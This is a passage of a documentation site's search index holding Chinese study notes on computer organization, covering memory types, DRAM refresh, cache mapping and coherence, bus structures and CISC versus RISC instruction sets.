\\]"},{"location":"course/%E8%AE%A1%E7%BB%84/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/#_14","title":"\u6027\u80fd\u6307\u6807","text":"<ul> <li>\u5b58\u50a8\u5bb9\u91cf   $$   \u5b58\u50a8\u5bb9\u91cf=\u5b58\u50a8\u5355\u5143\u683c\u6570\\times \u5b58\u50a8\u5b57\u957f(bit)   $$</li> <li>\u5b58\u50a8\u901f\u5ea6</li> <li>\u4f4d\u4ef7</li> </ul>"},{"location":"course/%E8%AE%A1%E7%BB%84/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/#_15","title":"\u6570\u636e\u5730\u5740\u548c\u5b58\u50a8\u987a\u5e8f","text":"<ul> <li>\u5927\u7aef\u6a21\u5f0f\uff1a\u9ad8\u4f4d\u4f4e\u5b58\uff08\u76f8\u53cd\uff09</li> <li>\u5c0f\u7aef\u6a21\u5f0f\uff1a\u9ad8\u4f4d\u9ad8\u5b58\uff08\u76f8\u540c\uff09</li> </ul>"},{"location":"course/%E8%AE%A1%E7%BB%84/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/#_16","title":"\u534a\u5bfc\u4f53\u5e38\u7528\u7684\u6269\u5c55\u65b9\u6cd5","text":"<ul> <li>\u4f4d\u6269\u5c55</li> <li>\u5b57\u6269\u5c55</li> </ul>"},{"location":"course/%E8%AE%A1%E7%BB%84/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/#_17","title":"\u4f53\u7cfb\u7ed3\u6784","text":""},{"location":"course/%E8%AE%A1%E7%BB%84/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/#ram","title":"RAM","text":""},{"location":"course/%E8%AE%A1%E7%BB%84/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/#sram","title":"SRAM","text":"<p>\u63a7\u5236\u4fe1\u53f7</p> <ul> <li>\\(\\overline{CS}\\)\uff1a\u7247\u9009\u7ebf\uff0c\u4f4e\u7535\u5e73\u6709\u6548</li> <li>\\(\\overline{WE}\\)\uff1a\u5199\u5141\u8bb8\u4fe1\u53f7\uff0c\u4f4e\u7535\u5e73\u5199\uff0c\u9ad8\u7535\u5e73\u8bfb</li> <li>\\(V_{CC}\\)\u548c\\(GND\\)\u662f\u7535\u6e90\u548c\u63a5\u5730\u7aef</li> </ul> <p>\u7279\u70b9</p> <ul> <li>\u4f18\u70b9\uff1a\u8bbf\u95ee\u901f\u5ea6\u5feb\uff0c\u5e38\u7528\u8bed\u544a\u8bc9\u6570\u636e\u5b58\u50a8\u5e94\u7528\u4e2d</li> <li>\u7f3a\u70b9\uff1a\u529f\u8017\u5927\uff0c\u6210\u672c\u9ad8</li> </ul>"},{"location":"course/%E8%AE%A1%E7%BB%84/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/#dram","title":"DRAM","text":"<p>\u5b58\u50a8\u5143\u91c7\u7528\u7684\u6676\u4f53\u7ba1\u6570\u91cf\u6bd4SRAM\u66f4\u5c11\uff0c\u6210\u672c\u548c\u529f\u8017\u66f4\u4f4e\uff0c\u4f46\u662f\u5bb9\u6613\u6f0f\u7535\uff0c\u9700\u8981\u5237\u65b0</p> <p>\u63a7\u5236\u4fe1\u53f7</p> <ul> <li>\\(\\overline{RAS}\\)\u548c\\(\\overline{CAS}\\)\u5206\u522b\u8868\u793a\u884c\u4fe1\u53f7\u9009\u62e9\u548c\u5217\u4fe1\u53f7\u9009\u62e9</li> <li>\\(\\overline{WE}\\)\u662f\u5199\u5141\u8bb8\u4fe1\u53f7</li> <li>\\(V_{CC}\\)\u3001\\(V_{SS}\\)\u3001\\(V_{SS}\\)\u63d0\u4f9bDRAM\u5de5\u4f5c\u548c\u5237\u65b0\u65f6\u6240\u9700\u8981\u7684\u7535\u5e73</li> <li>\\(GND\\)\u662f\u63a5\u5730\u7aef</li> </ul> <p>\u5237\u65b0\u7b56\u7565</p> <ul> <li>\u96c6\u4e2d\u5237\u65b0</li> </ul> <p>\u96c6\u4e2d\u5237\u65b0\u65b9\u5f0f\u662f\u6307\u5728 4000 \u4e2a\u5b58\u53d6\u5468\u671f\u4e2d\u53d6\u8fde\u7eed\u7684 128 \u4e2a\u5b58\u53d6\u5468\u671f,\u5bf9\u5b58\u50a8\u5668\u8fdb\u884c\u9010\u884c\u5237\u65b0,\u5982\u4e0b\u56fe\u6240\u793a\u3002\u8fd9\u79cd\u5237\u65b0\u7684\u7279\u70b9\u662f\u82af\u7247\u7684\u5237\u65b0\u64cd\u4f5c\u96c6\u4e2d\u5728 64 \u03bc s \u5185,\u5728\u8fd9\u4e2a\u65f6\u95f4\u6bb5\u4e2d, CPU \u662f\u4e0d\u80fd\u8bbf\u95ee DRAM \u7684,\u8fd9\u4e2a\u65f6\u95f4\u53c8\u79f0\u4e3a\u201c\u6b7b\u65f6\u95f4\u201d,\u800c 64 \u03bcs \u5bf9 CPU \u6765\u8bf4\u662f\u4e00\u4e2a\u76f8\u5f53\u957f\u7684\u65f6\u95f4\u3002\u96c6\u4e2d\u5237\u65b0\u65b9\u5f0f\u4e2d DRAM \u7684\u6b7b\u65f6\u95f4\u7387 =128 / 4000=3.2% \u3002</p> <p></p> <ul> <li>\u5206\u6563\u5237\u65b0</li> </ul> <p>\u5206\u6563\u5237\u65b0\u65b9\u5f0f\u662f\u6307\u5c06 4000 \u4e2a\u5b58\u53d6\u5468\u671f\u5206\u4e3a 2000 \u4e2a\u57fa\u672c\u5468\u671f,\u6bcf\u4e2a\u57fa\u672c\u5468\u671f\u4e2d\u5305\u542b\u4e24\u4e2a\u5b58\u53d6\u5468\u671f\u65f6\u95f4\u6bb5,\u5176\u4e2d\u4e00\u4e2a\u4f9b CPU \u8bbf\u95ee\u5b58\u50a8\u5668,\u53e6\u4e00\u4e2a\u7528\u4e8e\u5b58\u50a8\u5668\u81ea\u8eab\u7684\u9010\u884c\u5237\u65b0,\u5982\u4e0b\u56fe \u6240\u793a\u3002\u5206\u6563\u5237\u65b0\u867d\u7136\u5c06\u6b7b\u65f6\u95f4\u5206\u6563\u4e86,\u4f46\u662f\u6b7b\u65f6\u95f4\u7387 =1 / 2=50% ,\u6574\u4e2a\u7cfb\u7edf\u7684\u6548\u7387\u964d\u4f4e\u4e86\u3002</p> <p></p> <ul> <li>\u5f02\u6b65\u5237\u65b0</li> </ul> <p>\u5f02\u6b65\u5237 \u65b0 \u65b9 \u5f0f \u662f \u6307 \u5c06 4000 \u4e2a \u5b58 \u50a8 \u5468 \u671f \u5206 \u4e3a 128 \u4e2a \u65f6 \u95f4 \u6bb5,\u6bcf \u4e2a \u65f6 \u95f4 \u6bb5 15.5 \u03bc s(2ms / 128=15. 6 \u03bc s \u53d6\u5b58\u53d6\u5468\u671f\u7684\u6700\u5927\u6574\u6570\u500d),\u5373 31 \u4e2a\u5b58\u53d6\u5468\u671f,\u6bcf\u4e2a\u65f6\u95f4\u6bb5\u4e2d 30 \u4e2a\u5b58\u53d6\u5468\u671f\u7528\u4e8e\u5b58\u50a8\u5668\u7684\u8bfb\u53d6\u6216\u4fdd\u6301, 1 \u4e2a\u5b58\u53d6\u5468\u671f\u5bf9 DRAM \u4e2d\u7684\u4e00\u884c\u6267\u884c\u5237\u65b0\u64cd\u4f5c\u3002\u8fd9\u79cd\u5237\u65b0\u65b9\u5f0f\u7684\u6b7b\u65f6\u95f4\u7387 =1 / 31=3. 22% \u3002\u76f8\u8f83\u4e8e\u524d\u4e24\u79cd\u65b9\u5f0f,\u5f02\u6b65\u5237\u65b0\u65b9\u5f0f\u4e0d\u4f46\u5206\u6563\u4e86\u6b7b\u65f6\u95f4\u3002</p> <p></p>"},{"location":"course/%E8%AE%A1%E7%BB%84/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/#rom","title":"ROM","text":""},{"location":"course/%E8%AE%A1%E7%BB%84/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/#_18","title":"\u5206\u7c7b","text":"<ul> <li>MROM\uff1a\u63a9\u819c\u578b\u53ea\u8bfb\u5b58\u50a8\u5668\uff0c\u4e00\u822c\u7528\u4e8e\u5b58\u653e\u56fa\u5b9a\u7a0b\u5e8f\u548c\u6570\u636e\uff0c\u5982\u663e\u793a\u5b57\u7b26\u7684\u6a21\u70b9\u9635\u4ee3\u7801</li> <li>PROM\uff1a\u53ef\u7f16\u7a0b\u4e00\u6b21\u7684\u7684\u5236\u5ea6\u5b58\u50a8\u5668</li> <li>EPROM\uff1a\u7d2b\u5916\u7ebf\u53ef\u64e6\u9664\u53ef\u7f16\u7a0b\u53ea\u8bfb\u5b58\u50a8\u5668</li> <li>EEPROM\uff1a\u7535\u53ef\u64e6\u9664\u53ef\u7f16\u7a0b\u53ea\u8bfb\u5b58\u50a8\u5668</li> <li>FLASH\uff1a\u95ea\u5b58</li> </ul>"},{"location":"course/%E8%AE%A1%E7%BB%84/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/#_19","title":"\u9ad8\u901f\u7f13\u51b2\u5b58\u50a8\u5668","text":""},{"location":"course/%E8%AE%A1%E7%BB%84/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/#_20","title":"\u5de5\u4f5c\u539f\u7406","text":"<p>\u901a\u8fc7Cache\u6280\u672f\u63d0\u9ad8CPU\u8bbf\u95ee\u901f\u5ea6\u662f\u57fa\u4e8e\u7a0b\u5e8f\u5c40\u90e8\u6027\u539f\u7406\u3002</p> <p>\u7a0b\u5e8f\u5c40\u90e8\u6027\u539f\u7406\uff1a\u662f\u6307\u7a0b\u5e8f\u5728\u6267\u884c\u65f6\u5448\u73b0\u51fa\u5c40\u90e8\u6027\u89c4\u5f8b\uff0c\u5373\u5728\u4e00\u6bb5\u65f6\u95f4\u5185\uff0c\u6574\u4e2a\u7a0b\u5e8f\u7684\u6267\u884c\u4ec5\u9650\u4e8e\u7a0b\u5e8f\u4e2d\u7684\u67d0\u4e00\u90e8\u5206\u3002\u76f8\u5e94\u5730\uff0c\u6267\u884c\u6240\u8bbf\u95ee\u7684\u5b58\u50a8\u7a7a\u95f4\u4e5f\u5c40\u9650\u4e8e\u67d0\u4e2a\u5185\u5b58\u533a\u57df\uff0c\u5177\u4f53\u6765\u8bf4\uff0c\u5c40\u90e8\u6027\u901a\u5e38\u6709\u4e24\u79cd\u5f62\u5f0f\uff1a\u65f6\u95f4\u5c40\u90e8\u6027\u548c\u7a7a\u95f4\u5c40\u90e8\u6027\u3002</p> <ul> <li> <p>\u65f6\u95f4\u5c40\u90e8\u6027\uff1a\u88ab\u5f15\u7528\u8fc7\u4e00\u6b21\u7684\u5b58\u50a8\u5668\u4f4d\u7f6e\u5728\u672a\u6765\u4f1a\u88ab\u591a\u6b21\u5f15\u7528\uff08\u901a\u5e38\u5728\u5faa\u73af\u4e2d\uff09\u3002</p> </li> <li> <p>\u7a7a\u95f4\u5c40\u90e8\u6027\uff1a\u5982\u679c\u4e00\u4e2a\u5b58\u50a8\u5668\u7684\u4f4d\u7f6e\u88ab\u5f15\u7528\uff0c\u90a3\u4e48\u5c06\u6765\u4ed6\u9644\u8fd1\u7684\u4f4d\u7f6e\u4e5f\u4f1a\u88ab\u5f15\u7528\u3002</p> </li> </ul> <p>\u6027\u80fd\u6307\u6807</p> <ul> <li>\u7f13\u5b58\u547d\u4e2d\u7387</li> <li>Cache-\u4e3b\u5b58\u7cfb\u7edf\u7684\u5e73\u5747\u8bbf\u95ee\u65f6\u95f4\u548cCache\u6548\u7387</li> </ul>"},{"location":"course/%E8%AE%A1%E7%BB%84/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/#_21","title":"\u67b6\u6784\u56fe","text":""},{"location":"course/%E8%AE%A1%E7%BB%84/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/#cache-","title":"Cache-\u4e3b\u5b58\u7684\u5730\u5740\u6620\u5c04\u548c\u53d8\u6362","text":"<ul> <li>\u76f4\u63a5\u6620\u5c04</li> </ul> <p>\u628a\u4e3b\u5b58\u4e2d\u7684A\u5730\u5740\u59cb\u7ec8\u6620\u5c04\u5728Cache\u4e2d\u7684\u7279\u5b9a\u4f4d\u7f6e\uff0c\u6bd4\u5982\u5bf9\u4e8e\u4e3b\u5b58\u5730\u5740\u8fdb\u884c\u53d6\u6a21\u8fd0\u7b97\u7136\u540e\u6620\u5c04\u7f13\u5b58</p> <p></p> <ul> <li>\u5168\u76f8\u8054\u6620\u5c04</li> </ul> <p>\u5c06\u4e3b\u5b58\u548cCache\u4efb\u610f\u6620\u5c04\u3002\u4e3b\u5b58\u4e2dA\u5730\u5740\u7684\u6570\u636e\u653e\u5165\u540e\uff0cA\u5730\u5740\u7684\u4e3b\u5b58\u5757\u53f7\u4f1a\u88ab\u6807\u8bb0\uff0c\u4ee5\u7528\u6765\u6620\u5c04Cache</p> <ul> <li>\u7ec4\u76f8\u8054\u6620\u5c04\uff08\u76ee\u524d\u4f7f\u7528\u6700\u5e7f\u6cdb\uff09</li> </ul> <p>\u5728\u5168\u76f8\u8054\u7684\u57fa\u7840\u4e0a\u52a0\u4e0a\u4e00\u4e2a\u5206\u7ec4\u7684\u7b56\u7565\uff0c\u4e5f\u5c31\u662f\u5206\u7ec4\u6620\u5c04\u3002</p>"},{"location":"course/%E8%AE%A1%E7%BB%84/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/#cache","title":"Cache\u66ff\u6362\u7b56\u7565","text":"<ul> <li>\u968f\u673a\u7b97\u6cd5</li> <li>LRU\u7b97\u6cd5</li> <li>LFU\u7b97\u6cd5</li> </ul>"},{"location":"course/%E8%AE%A1%E7%BB%84/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/#cache_1","title":"Cache\u548c\u4e3b\u5b58\u7684\u4e00\u81f4\u6027","text":"<p>\u53ef\u53c2\u80032.4 CPU \u7f13\u5b58\u4e00\u81f4\u6027 | \u5c0f\u6797coding (xiaolincoding.com)</p> <ul> <li> <p>\u5199\u56de\u6cd5\uff1a\u53ea\u5199Cache\u5e76\u6807\u8bb0\uff0c\u66ff\u6362\u51fa\u53bb\u662f\u6839\u636e\u6807\u8bb0\u51b3\u5b9a\u662f\u5426\u5199\u56de\u78c1\u76d8\u3002\u5bb9\u6613\u5bfc\u81f4\u4e0d\u4e00\u81f4\u95ee\u9898</p> </li> <li> <p>\u5199\u76f4\u8fbe\uff1a\u5199\u56de\u7f13\u5b58\u7684\u540c\u65f6\u5199\u56de\u4e3b\u5b58\u3002\u4fdd\u8bc1\u4e86\u4e00\u81f4\uff0c\u4f46\u662f\u6548\u7387\u6781\u4f4e</p> </li> <li> <p>\u5199\u4e00\u6b21\uff1a\u7b2c\u4e00\u6b21\u5199\u547d\u4e2d\u662f\u91c7\u7528\u5199\u76f4\u8fbe\uff0c\u4e4b\u540e\u91c7\u7528\u5199\u56de\u3002\u591a\u6838\u5fc3\u4e0b\u65e0\u6cd5\u4fdd\u8bc1\u6570\u636e\u4e00\u81f4\u6027\u3002</p> </li> <li> <p>MESI\uff1a\u5c06\u5199\u56de\u7b97\u6cd5\u548c\u72b6\u6001\u6807\u8bb0\u7ed3\u5408\uff0c\u4fdd\u8bc1\u4e86\u6570\u636e\u4e00\u81f4\u6027\uff0c\u4f46\u662f\u5b58\u5728\u4f2a\u5171\u4eab\u7684\u95ee\u9898</p> </li> </ul> <p></p>"},{"location":"course/%E8%AE%A1%E7%BB%84/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/#4","title":"\u7b2c4\u7ae0 \u603b\u7ebf\u6280\u672f","text":""},{"location":"course/%E8%AE%A1%E7%BB%84/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/#_22","title":"\u6982\u8ff0","text":"<p>\u603b\u7ebf\u7684\u7279\u70b9\uff1a\u5171\u4eab\u6027\u548c\u72ec\u7acb\u6027</p> <ul> <li>\u5171\u4eab\u6027\uff1a\u603b\u7ebf\u7cfb\u7edf\u5185\u7684\u6240\u6709\u8bbe\u5907\u53ef\u7528</li> <li>\u72ec\u7acb\u6027\uff1a\u540c\u4e00\u65f6\u95f4\u5185\u53ea\u80fd\u6709\u4e00\u4e2a\u8bbe\u5907\u4f7f\u7528\u603b\u7ebf</li> </ul>"},{"location":"course/%E8%AE%A1%E7%BB%84/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/#_23","title":"\u5206\u7c7b","text":"\\[ \u603b\u7ebf\\begin{cases}     \u6309\u603b\u7ebf\u7684\u7ed3\u6784\u5c42\u6b21\u5206\u7c7b&amp;\\begin{cases}     \u7247\u5185\u603b\u7ebf(\u82af\u7247\u5185\u90e8\uff0c\u5982CPU\u7684\u5185\u90e8\u603b\u7ebf)\\\\     \u5c40\u90e8\u603b\u7ebf(\u7528\u4e8e\u82af\u7247\u4e00\u7ea7\u7684\u8fde\u63a5)\\\\     \u7cfb\u7edf\u603b\u7ebf(\u7528\u4e8e\u8ba1\u7b97\u673a\u90e8\u4ef6\u4e00\u7ea7\u7684\u8fde\u63a5\uff0c\u5982ISA,PCI)\\\\     \u5916\u90e8\u603b\u7ebf(\u8fde\u63a5\u591a\u4e2a\u8ba1\u7b97\u673a\u7684\u603b\u7ebf\uff0c\u5982\u7f51\u7ebf,USB\u7ebf)     \\end{cases}\\\\\\\\     \u6309\u529f\u80fd\u5206\u7c7b&amp;\\begin{cases}     \u6570\u636e\u603b\u7ebf(Data Bas)\\\\     \u5730\u5740\u603b\u7ebf(Address Bas)\\\\     \u63a7\u5236\u603b\u7ebf(ControllBas)     \\end{cases}\\\\\\\\     \u6309\u6570\u636e\u4f20\u8f93\u683c\u5f0f\u5206\u7c7b&amp;\\begin{cases}     \u5e76\u884c\u603b\u7ebf\\\\     \u4e32\u884c\u603b\u7ebf     \\end{cases}\\\\\\\\     \u6309\u65f6\u5e8f\u63a7\u5236\u65b9\u5f0f\u5206\u7c7b&amp;\\begin{cases}     \u540c\u6b65\u603b\u7ebf\\\\     \u5f02\u6b65\u603b\u7ebf     \\end{cases} \\end{cases} \\]"},{"location":"course/%E8%AE%A1%E7%BB%84/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/#_24","title":"\u603b\u7ebf\u7684\u6027\u80fd\u6307\u6807","text":"<ul> <li>\u603b\u7ebf\u5bbd\u5ea6\uff1a\u603b\u7ebf\u540c\u65f6\u80fd\u4f20\u9001\u7684\u4e8c\u8fdb\u5236\u6570\u636e\u7684\u4f4d\u6570</li> <li>\u603b\u7ebf\u5de5\u4f5c\u9891\u7387\uff1a\u603b\u7ebf\u6bcf\u79d2\u4f20\u8f93\u6570\u636e\u7684\u6b21\u6570\u3002\u5e38\u7528\\(MHz\\)\u8868\u793a</li> <li>\u603b\u7ebf\u5e26\u5bbd\uff1a\u603b\u7ebf\u6570\u636e\u4f20\u8f93\u901f\u7387\uff0c\u8ba1\u7b97\u516c\u5f0f\u4e3a\uff1a\\(\u603b\u7ebf\u5e26\u5bbd=\u603b\u7ebf\u5bbd\u5ea6\\times \u603b\u7ebf\u5de5\u4f5c\u9891\u7387\\)</li> </ul>"},{"location":"course/%E8%AE%A1%E7%BB%84/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/#_25","title":"\u7cfb\u7edf\u603b\u7ebf\u7ed3\u6784","text":""},{"location":"course/%E8%AE%A1%E7%BB%84/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/#_26","title":"\u5355\u603b\u7ebf\u7ed3\u6784","text":"<p>\u7279\u70b9</p> <ul> <li>\u7ed3\u6784\u7b80\u5355\uff0c\u7075\u6d3b\uff0c\u6613\u6269\u5c55</li> <li>\u6027\u80fd\u4f4e</li> </ul>"},{"location":"course/%E8%AE%A1%E7%BB%84/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/#_27","title":"\u53cc\u603b\u7ebf\u7ed3\u6784","text":"<p>\u7279\u70b9</p> <ul> <li>\u6548\u7387\u76f8\u6bd4\u5355\u603b\u7ebf\u6709\u6240\u63d0\u9ad8</li> <li>\u786c\u4ef6\u590d\u6742\u5ea6\u76f8\u6bd4\u5355\u603b\u7ebf\u66f4\u590d\u6742</li> </ul>"},{"location":"course/%E8%AE%A1%E7%BB%84/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/#_28","title":"\u591a\u603b\u7ebf\u7ed3\u6784","text":"<p>\u5f62\u5f0f\u591a\u79cd\u591a\u6837\uff0c\u4e0d\u4e3e\u4f8b\uff0c\u53ef\u53c2\u8003\u7b2c3\u7ae0 \u7cfb\u7edf\u603b\u7ebf | MyBlog - GxkOrd</p> <p>\u5171\u540c\u7279\u70b9</p> <ul> <li>\u517c\u5bb9\u9ad8\u901f\u548c\u4f4e\u901f\u7684\u8bbe\u5907\uff0c\u6027\u80fd\u9ad8</li> <li>\u590d\u6742\u5ea6\u5927\u5927\u589e\u52a0</li> </ul>"},{"location":"course/%E8%AE%A1%E7%BB%84/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/#_29","title":"\u603b\u7ebf\u7684\u901a\u4fe1\u65b9\u5f0f","text":"<pre><code>---\ntitle: \u603b\u7ebf\u5468\u671f\n---\nflowchart \nA(\u603b\u7ebf\u8bf7\u6c42\u548c\u4ef2\u88c1\u9636\u6bb5)--\"\u83b7\u53d6\u603b\u7ebf\u63a7\u5236\u6743\uff0c\u6210\u4e3a\u4e3b\u8bbe\u5907\"--&gt;B(\u5bfb\u5740\u9636\u6bb5)--\u53d1\u51fa\u9700\u8981\u8bbf\u95ee\u7684\u5b58\u50a8\u5668\u6216I/O\u7aef\u53e3\u548c\u63a7\u5236\u4fe1\u53f7--&gt;C(\u4f20\u9001\u6570\u636e\u9636\u6bb5)--\u4e3b\u8bbe\u5907\u548c\u4ece\u8bbe\u5907\u8fdb\u884c\u6570\u636e\u4f20\u8f93--&gt;D(\"\u7ed3\u675f\u9636\u6bb5 \u4ea4\u51fa\u63a7\u5236\u6743\")\n</code></pre> <ul> <li>\u540c\u6b65\u901a\u4fe1\uff1a\u53d1\u9001\u548c\u63a5\u53d7\u53cc\u65b9\u90fd\u5728\u540c\u4e00\u65f6\u949f\u4e0b\u8fdb\u884c\u64cd\u4f5c\u3002</li> <li>\u4f18\u70b9\uff1a\u65f6\u5e8f\u7b80\u5355\uff0c\u63a7\u5236\u65b9\u4fbf\uff0c\u9002\u7528\u4e8e\u603b\u7ebf\u957f\u5ea6\u8f83\u77ed\uff0c\u5404\u90e8\u4ef6\u5b58\u53d6\u65f6\u95f4\u63a5\u8fd1\u7684\u60c5\u51b5\u3002\u5177\u6709\u8f83\u9ad8\u7684\u4f20\u8f93\u9891\u7387</li> <li>\u7f3a\u70b9\uff1a\u5982\u679c\u5404\u8bbe\u5907\u4e4b\u95f4\u901f\u5ea6\u5dee\u522b\u5f88\u5927\uff0c\u4f1a\u4f7f\u5f97\u5feb\u901f\u5730\u8bbe\u5907\u7b49\u5f85\u6162\u901f\u7684\u8bbe\u5907\u3002\u5bfc\u81f4\u8d44\u6e90\u6d6a\u8d39</li> <li>\u5f02\u6b65\u901a\u4fe1\uff1a\u5141\u8bb8\u5404\u8bbe\u5907\u6709\u81ea\u5df1\u7684\u65f6\u949f\u63a7\u5236\u3002\u6570\u636e\u4f20\u8f93\u91c7\u7528\u7b54\u5e94\u6a21\u5f0f\uff08\u63e1\u624b\u65b9\u5f0f\uff09</li> <li>\u4f18\u70b9\uff1a\u901f\u5ea6\u548c\u53ef\u9760\u6027\u90fd\u6709\u6240\u589e\u5f3a</li> <li>\u7f3a\u70b9\uff1a\u4f20\u8f93\u8fc7\u7a0b\u590d\u6742\uff0c\u7531\u4e8e\u589e\u52a0\u4e86\u7b54\u5e94\u65f6\u95f4\uff0c\u901f\u5ea6\u8fd8\u662f\u6709\u6240\u5f71\u54cd\u3002</li> <li>\u534a\u540c\u6b65\u63a7\u5236\u65b9\u5f0f\uff1a\u7ed3\u5408\u540c\u6b65\u548c\u5f02\u6b65\uff0c\u91c7\u7528\u516c\u5171\u65f6\u949f\uff0c\u5bf9\u4e8e\u901f\u5ea6\u76f8\u8fdb\u7684\u91c7\u7528\u540c\u6b65\u901a\u4fe1\u3002\u901f\u5ea6\u8f83\u6162\u7684\u589e\u52a0\u4e00\u4e2a\u7b49\u5f85\u7684\u9636\u6bb5</li> </ul>"},{"location":"course/%E8%AE%A1%E7%BB%84/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/#_30","title":"\u603b\u7ebf\u4fe1\u606f\u4f20\u9001","text":"<ul> <li>\u4e32\u884c\u4f20\u9001\uff1a\u4ece\u4f4e\u4f4d\u5230\u9ad8\u4f4d\u4f9d\u6b21\u4f20\u9001\u6570\u636e\u3002\u901f\u5ea6\u8f83\u6162\uff0c\u6210\u672c\u4f4e\uff0c\u9002\u5408\u8fdc\u8ddd\u79bb\u4f20\u9001</li> <li>\u5e76\u884c\u4f20\u9001\uff1a\u6240\u6709\u4f4d\u540c\u65f6\u53d1\u9001\uff0c\u6bcf\u4e00\u4f4d\u90fd\u6709\u5404\u81ea\u7684\u4f20\u8f93\u7ebf\u3002\u901f\u5ea6\u5feb\uff0c\u4f46\u662f\u7ebf\u6570\u8981\u6c42\u591a\uff0c\u6210\u672c\u9ad8\u3002\u9002\u5408\u8fd1\u8ddd\u79bb\u4f20\u9001</li> <li>\u4e32\u5e76\u884c\u4f20\u9001\uff1a\u5206\u7ec4\uff0c\u7ec4\u5185\u5e76\u884c\u4f20\u9001\uff0c\u7ec4\u4e0e\u7ec4\u4e32\u884c\u4f20\u9001\u3002</li> <li>\u5206\u65f6\u4f20\u9001</li> </ul>"},{"location":"course/%E8%AE%A1%E7%BB%84/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/#5","title":"\u7b2c5\u7ae0 \u6307\u4ee4\u7cfb\u7edf","text":""},{"location":"course/%E8%AE%A1%E7%BB%84/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/#_31","title":"\u6307\u4ee4\u7cfb\u7edf\u7684\u5206\u7c7b","text":""},{"location":"course/%E8%AE%A1%E7%BB%84/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/#cisc","title":"CISC","text":"<p>CISC(Complex Instruction Set Computer)</p> <p>\u590d\u6742\u6307\u4ee4\u96c6\u8ba1\u7b97\u673a\uff0c\u76ee\u7684\u662f\u5f3a\u5316\u6307\u4ee4\u529f\u80fd\uff0c\u5b9e\u73b0\u8f6f\u4ef6\u529f\u80fd\u6027\u786c\u4ef6\u529f\u80fd\u8f6c\u79fb\u3002\u66f4\u9002\u7528\u4e8e\u901a\u7528\u673a\uff0c\u6211\u4eec\u65e5\u5e38\u4f7f\u7528\u7684PC\u901a\u5e38\u5c31\u662f\u4f7f\u7528CISC\u67b6\u6784\u3002\u4ee5InterX86\u4e3a\u5178\u578b\u3002</p> <p>\u7279\u70b9</p> <ul> <li>\u5177\u6709\u5e9e\u5927\u7684\u6307\u4ee4\u7cfb\u7edf</li> <li>\u91c7\u7528\u53ef\u53d8\u957f\u5ea6\u7684\u6307\u4ee4\u683c\u5f0f</li> <li>\u6307\u4ee4\u5bfb\u5740\u65b9\u5f0f\u591a\u6837</li> <li>\u6307\u4ee4\u7cfb\u7edf\u4e2d\u5305\u542b\u4e00\u4e9b\u7279\u6b8a\u7528\u9014\u7684\u6307\u4ee4</li> </ul>"},{"location":"course/%E8%AE%A1%E7%BB%84/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/#risc","title":"RISC","text":"<p>RISC(Reduced Instruction Set Computer)</p> <p>\u7cbe\u7b80\u6307\u4ee4\u96c6\u8ba1\u7b97\u673a\uff0c\u76ee\u7684\u662f\u5c3d\u53ef\u80fd\u964d\u4f4e\u6307\u4ee4\u96c6\u7684\u590d\u6742\u5ea6\uff0c\u5df2\u8fbe\u5230\u7b80\u5316\u5b9e\u73b0\u3001\u63d0\u9ad8\u6027\u80fd\u7684\u76ee\u7684\u3002\u66f4\u9002\u7528\u4e8e\u4e13\u7528\u673a\u3002\u5982MISP\u3001Motorola\u7b49\u5fae\u5904\u7406\u673a\u3002</p> <p>\u7279\u70b9</p> <ul> <li>\u6307\u4ee4\u6570\u91cf\u8f83\u5c11</li> <li>\u6307\u4ee4\u957f\u5ea6\u56fa\u5b9a</li> 